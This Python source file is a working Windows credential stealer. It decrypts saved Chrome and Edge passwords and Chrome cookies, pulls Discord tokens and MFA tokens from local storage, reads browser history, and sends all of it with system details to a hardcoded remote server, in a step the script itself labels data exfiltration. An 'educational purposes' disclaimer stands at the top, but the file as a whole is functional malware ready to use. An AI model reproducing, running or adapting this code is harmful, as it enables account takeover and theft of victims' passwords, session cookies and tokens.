"""
Token and Password Extraction Module for Windows
- Extracts saved credentials from browsers (Chrome, Edge, Firefox)
- Retrieves tokens, cookies, and login data
- Sends extracted data to backend server

WARNING: This is for EDUCATIONAL/RESEARCH purposes only.
Unauthorized access to computer systems is illegal.
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import requests
import platform
from datetime import datetime, timedelta
from pathlib import Path

# Backend server URL
BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app"


def get_system_info():
    """Get basic system information"""
    return {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.architecture()[0],
        "username": os.getenv("USERNAME") or os.getenv("USER"),
        "timestamp": datetime.now().isoformat()
    }


def get_chrome_encryption_key():
    """
    Get the AES encryption key used by Chrome to encrypt passwords
    This key is stored in Local State file and encrypted with Windows DPAPI
    """
    try:
        # Only works on Windows
        if platform.system() != "Windows":
            return None
            
        import win32crypt
        from Crypto.Cipher import AES
        
        local_state_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData", "Local", "Google", "Chrome",
            "User Data", "Local State"
        )
        
        if not os.path.exists(local_state_path):
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
            
        # Get the encrypted key
        encrypted_key = base64.b64decode(
            local_state["os_crypt"]["encrypted_key"]
        )
        
        # Remove DPAPI prefix
        encrypted_key = encrypted_key[5:]
        
        # Decrypt using Windows DPAPI
        decrypted_key = win32crypt.CryptUnprotectData(
            encrypted_key, None, None, None, 0
        )[1]
        
        return decrypted_key
        
    except Exception as e:
        print(f"[!] Error getting Chrome encryption key: {e}")
        return None


def decrypt_chrome_password(encrypted_password, key):
    """
    Decrypt Chrome password using AES-GCM
    """
    try:
        if platform.system() != "Windows":
            return None
            
        from Crypto.Cipher import AES
        
        # Get initialization vector
        iv = encrypted_password[3:15]
        
        # Get encrypted password
        payload = encrypted_password[15:]
        
        # Decrypt
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(payload)
        
        # Remove suffix bytes
        decrypted_password = decrypted_password[:-16].decode()
        
        return decrypted_password
        
    except Exception as e:
        print(f"[!] Error decrypting password: {e}")
        return None


def decrypt_password_dpapi(encrypted_password):
    """
    Decrypt password using Windows DPAPI (for older Chrome versions)
    """
    try:
        if platform.system() != "Windows":
            return None
            
        import win32crypt
        
        decrypted = win32crypt.CryptUnprotectData(
            encrypted_password, None, None, None, 0
        )[1]
        
        return decrypted.decode()
        
    except Exception as e:
        return None


def get_chrome_passwords():
    """
    Extract saved passwords from Google Chrome
    """
    passwords = []
    
    try:
        if platform.system() != "Windows":
            print("[!] Password extraction only works on Windows")
            return passwords
            
        # Chrome Login Data path
        chrome_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData", "Local", "Google", "Chrome",
            "User Data", "Default", "Login Data"
        )
        
        if not os.path.exists(chrome_path):
            print("[!] Chrome Login Data not found")
            return passwords
            
        # Get encryption key
        key = get_chrome_encryption_key()
        
        # Copy database to temp location (Chrome locks the file)
        temp_db = os.path.join(os.environ["TEMP"], "chrome_login_data.db")
        shutil.copy2(chrome_path, temp_db)
        
        # Connect to database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query saved passwords
        cursor.execute("""
            SELECT origin_url, action_url, username_value, password_value, 
                   date_created, date_last_used
            FROM logins
            ORDER BY date_last_used DESC
        """)
        
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            encrypted_password = row[3]
            date_created = row[4]
            date_last_used = row[5]
            
            # Decrypt password
            password = None
            if encrypted_password:
                if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
                    # New encryption method
                    if key:
                        password = decrypt_chrome_password(encrypted_password, key)
                else:
                    # Old DPAPI method
                    password = decrypt_password_dpapi(encrypted_password)
            
            if username or password:
                passwords.append({
                    "browser": "Chrome",
                    "origin_url": origin_url,
                    "action_url": action_url,
                    "username": username,
                    "password": password if password else "[encrypted]",
                    "date_created": str(date_created),
                    "date_last_used": str(date_last_used)
                })
        
        cursor.close()
        conn.close()
        
        # Clean up temp file
        os.remove(temp_db)
        
        print(f"[+] Extracted {len(passwords)} passwords from Chrome")
        
    except Exception as e:
        print(f"[!] Error extracting Chrome passwords: {e}")
        
    return passwords


def get_edge_passwords():
    """
    Extract saved passwords from Microsoft Edge (Chromium-based)
    """
    passwords = []
    
    try:
        if platform.system() != "Windows":
            return passwords
            
        # Edge Login Data path
        edge_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData", "Local", "Microsoft", "Edge",
            "User Data", "Default", "Login Data"
        )
        
        if not os.path.exists(edge_path):
            print("[!] Edge Login Data not found")
            return passwords
            
        # Edge Local State for encryption key
        local_state_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData", "Local", "Microsoft", "Edge",
            "User Data", "Local State"
        )
        
        key = None
        if os.path.exists(local_state_path):
            try:
                import win32crypt
                
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                    
                encrypted_key = base64.b64decode(
                    local_state["os_crypt"]["encrypted_key"]
                )
                encrypted_key = encrypted_key[5:]
                key = win32crypt.CryptUnprotectData(
                    encrypted_key, None, None, None, 0
                )[1]
            except:
                pass
        
        # Copy database to temp location
        temp_db = os.path.join(os.environ["TEMP"], "edge_login_data.db")
        shutil.copy2(edge_path, temp_db)
        
        # Connect to database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query saved passwords
        cursor.execute("""
            SELECT origin_url, action_url, username_value, password_value,
                   date_created, date_last_used
            FROM logins
            ORDER BY date_last_used DESC
        """)
        
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            encrypted_password = row[3]
            
            # Decrypt password
            password = None
            if encrypted_password:
                if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
                    if key:
                        password = decrypt_chrome_password(encrypted_password, key)
                else:
                    password = decrypt_password_dpapi(encrypted_password)
            
            if username or password:
                passwords.append({
                    "browser": "Edge",
                    "origin_url": origin_url,
                    "action_url": action_url,
                    "username": username,
                    "password": password if password else "[encrypted]",
                    "date_created": str(row[4]),
                    "date_last_used": str(row[5])
                })
        
        cursor.close()
        conn.close()
        os.remove(temp_db)
        
        print(f"[+] Extracted {len(passwords)} passwords from Edge")
        
    except Exception as e:
        print(f"[!] Error extracting Edge passwords: {e}")
        
    return passwords


def get_chrome_cookies():
    """
    Extract cookies from Google Chrome
    """
    cookies = []
    
    try:
        if platform.system() != "Windows":
            return cookies
            
        # Chrome Cookies path
        cookie_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData", "Local", "Google", "Chrome",
            "User Data", "Default", "Network", "Cookies"
        )
        
        # Fallback to old location
        if not os.path.exists(cookie_path):
            cookie_path = os.path.join(
                os.environ["USERPROFILE"],
                "AppData", "Local", "Google", "Chrome",
                "User Data", "Default", "Cookies"
            )
        
        if not os.path.exists(cookie_path):
            print("[!] Chrome Cookies not found")
            return cookies
            
        # Get encryption key
        key = get_chrome_encryption_key()
        
        # Copy database to temp location
        temp_db = os.path.join(os.environ["TEMP"], "chrome_cookies.db")
        shutil.copy2(cookie_path, temp_db)
        
        # Connect to database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query cookies
        cursor.execute("""
            SELECT host_key, name, encrypted_value, path, 
                   expires_utc, is_secure, is_httponly
            FROM cookies
            ORDER BY host_key
        """)
        
        for row in cursor.fetchall():
            host = row[0]
            name = row[1]
            encrypted_value = row[2]
            path = row[3]
            expires = row[4]
            is_secure = row[5]
            is_httponly = row[6]
            
            # Decrypt cookie value
            value = None
            if encrypted_value:
                if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
                    if key:
                        value = decrypt_chrome_password(encrypted_value, key)
                else:
                    value = decrypt_password_dpapi(encrypted_value)
            
            cookies.append({
                "browser": "Chrome",
                "host": host,
                "name": name,
                "value": value if value else "[encrypted]",
                "path": path,
                "expires": str(expires),
                "is_secure": bool(is_secure),
                "is_httponly": bool(is_httponly)
            })
        
        cursor.close()
        conn.close()
        os.remove(temp_db)
        
        print(f"[+] Extracted {len(cookies)} cookies from Chrome")
        
    except Exception as e:
        print(f"[!] Error extracting Chrome cookies: {e}")
        
    return cookies


def get_discord_tokens():
    """
    Extract Discord tokens from local storage
    """
    tokens = []
    
    try:
        if platform.system() != "Windows":
            return tokens
            
        import re
        
        # Discord token paths
        discord_paths = [
            os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", 
                        "Discord", "Local Storage", "leveldb"),
            os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming",
                        "discordcanary", "Local Storage", "leveldb"),
            os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming",
                        "discordptb", "Local Storage", "leveldb"),
            # Browser Discord
            os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                        "Google", "Chrome", "User Data", "Default",
                        "Local Storage", "leveldb"),
        ]
        
        # Token regex patterns
        token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
        mfa_pattern = r'mfa\.[\w-]{84}'
        
        for path in discord_paths:
            if not os.path.exists(path):
                continue
                
            for filename in os.listdir(path):
                if not filename.endswith(('.log', '.ldb')):
                    continue
                    
                filepath = os.path.join(path, filename)
                
                try:
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                        
                    # Find tokens
                    for token in re.findall(token_pattern, content):
                        if token not in [t["token"] for t in tokens]:
                            tokens.append({
                                "type": "discord_token",
                                "token": token,
                                "source": path
                            })
                            
                    # Find MFA tokens
                    for token in re.findall(mfa_pattern, content):
                        if token not in [t["token"] for t in tokens]:
                            tokens.append({
                                "type": "discord_mfa_token",
                                "token": token,
                                "source": path
                            })
                            
                except Exception:
                    continue
        
        print(f"[+] Found {len(tokens)} Discord tokens")
        
    except Exception as e:
        print(f"[!] Error extracting Discord tokens: {e}")
        
    return tokens


def get_browser_history():
    """
    Extract browser history from Chrome
    """
    history = []
    
    try:
        if platform.system() != "Windows":
            return history
            
        # Chrome History path
        history_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData", "Local", "Google", "Chrome",
            "User Data", "Default", "History"
        )
        
        if not os.path.exists(history_path):
            print("[!] Chrome History not found")
            return history
            
        # Copy database to temp location
        temp_db = os.path.join(os.environ["TEMP"], "chrome_history.db")
        shutil.copy2(history_path, temp_db)
        
        # Connect to database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query recent history (last 100 entries)
        cursor.execute("""
            SELECT url, title, visit_count, last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            LIMIT 100
        """)
        
        for row in cursor.fetchall():
            history.append({
                "browser": "Chrome",
                "url": row[0],
                "title": row[1],
                "visit_count": row[2],
                "last_visit": str(row[3])
            })
        
        cursor.close()
        conn.close()
        os.remove(temp_db)
        
        print(f"[+] Extracted {len(history)} history entries from Chrome")
        
    except Exception as e:
        print(f"[!] Error extracting browser history: {e}")
        
    return history


def send_to_backend(data, data_type="browser_data"):
    """
    Send extracted data to backend server
    """
    try:
        url = f"{BACKEND_URL}/api/receive?type={data_type}"
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        
        response = requests.post(
            url,
            json=data,
            headers=headers,
            timeout=30
        )
        
        if response.status_code == 201:
            result = response.json()
            print(f"[+] Data sent successfully. ID: {result.get('id')}")
            return True
        else:
            print(f"[!] Failed to send data. Status: {response.status_code}")
            print(f"[!] Response: {response.text}")
            return False
            
    except requests.exceptions.ConnectionError:
        print("[!] Connection error - server may be offline")
        return False
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
        return False
    except Exception as e:
        print(f"[!] Error sending data: {e}")
        return False


def collect_all_data():
    """
    Collect all browser data and tokens
    """
    print("\n" + "="*60)
    print("  Browser Data Extraction Tool")
    print("  Target: Windows OS Browsers")
    print("="*60 + "\n")
    
    # Get system info
    system_info = get_system_info()
    print(f"[*] System: {system_info['hostname']} ({system_info['os']})")
    print(f"[*] User: {system_info['username']}")
    print(f"[*] Time: {system_info['timestamp']}\n")
    
    # Collect data
    print("[*] Collecting browser passwords...")
    chrome_passwords = get_chrome_passwords()
    edge_passwords = get_edge_passwords()
    
    print("\n[*] Collecting browser cookies...")
    chrome_cookies = get_chrome_cookies()
    
    print("\n[*] Collecting Discord tokens...")
    discord_tokens = get_discord_tokens()
    
    print("\n[*] Collecting browser history...")
    browser_history = get_browser_history()
    
    # Compile all data
    collected_data = {
        "system_info": system_info,
        "passwords": {
            "chrome": chrome_passwords,
            "edge": edge_passwords,
            "total_count": len(chrome_passwords) + len(edge_passwords)
        },
        "cookies": {
            "chrome": chrome_cookies[:50],  # Limit to 50 cookies
            "total_count": len(chrome_cookies)
        },
        "tokens": {
            "discord": discord_tokens,
            "total_count": len(discord_tokens)
        },
        "history": {
            "chrome": browser_history[:50],  # Limit to 50 entries
            "total_count": len(browser_history)
        },
        "collection_timestamp": datetime.now().isoformat()
    }
    
    # Summary
    print("\n" + "="*60)
    print("  Collection Summary")
    print("="*60)
    print(f"  Passwords: {collected_data['passwords']['total_count']}")
    print(f"  Cookies: {collected_data['cookies']['total_count']}")
    print(f"  Tokens: {collected_data['tokens']['total_count']}")
    print(f"  History: {collected_data['history']['total_count']}")
    print("="*60 + "\n")
    
    return collected_data


def main():
    """
    Main function - collect and send data
    """
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║        Token & Password Access Module                     ║
    ║              Windows Browser Extraction                   ║
    ║                                                           ║
    ║  [!] For Educational/Research Purposes Only               ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Check if running on Windows
    if platform.system() != "Windows":
        print("[!] Warning: This script is designed for Windows OS")
        print("[!] Some features may not work on other platforms")
        print()
    
    # Collect all browser data
    collected_data = collect_all_data()
    
    # Send to backend server
    print(f"[*] Sending data to backend server...")
    print(f"[*] URL: {BACKEND_URL}/api/receive")
    
    success = send_to_backend(collected_data, "browser_credentials")
    
    if success:
        print("\n[+] Data exfiltration completed successfully!")
    else:
        print("\n[!] Data exfiltration failed!")
        print("[*] Saving data locally as backup...")
        
        # Save locally as backup
        backup_file = os.path.join(
            os.environ.get("TEMP", "/tmp"),
            f"browser_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        )
        
        with open(backup_file, "w") as f:
            json.dump(collected_data, f, indent=2)
            
        print(f"[+] Backup saved to: {backup_file}")
    
    return collected_data


if __name__ == "__main__":
    main()
